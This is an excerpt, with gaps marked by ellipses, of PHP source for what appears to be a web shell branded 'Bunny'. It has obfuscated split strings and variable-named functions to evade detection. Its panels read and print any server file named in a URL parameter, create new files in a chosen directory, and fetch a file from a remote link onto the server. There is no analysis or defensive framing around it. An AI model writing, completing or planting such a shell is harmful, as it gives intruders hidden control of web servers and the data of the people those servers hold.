...
<input type="text" name="darilink" class="up" placeholder="https'.'://'.'bunny'.'invisible'.'404.'.'fbi.'.'gov/">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
...
if (isset($_GET['SiBunny'])) {
	echo "<tr><td>Current Fi"."le : ".$_GET['SiBunny'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars($fgt($_GET['SiBunny']))."</pre>";
	author();
...
} elseif (isset($_POST['Bunny'.'GG']) && $_POST['pilih'] == "fi"."le") {
    if ($isw("./") || $isr("./")) {
        $loke = $_POST['Bunny'.'GG'];
        if (isset($_POST['buatfi'.'le'])) {
            ...
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
                ...
                echo '<input type="hidden" name="BunnyGG" value="'.$_POST['Bunny'.'GG'].'">
            ...
            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="BunnyGG" value="'.$_POST['Bunny'.'GG'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
        }
    }
}
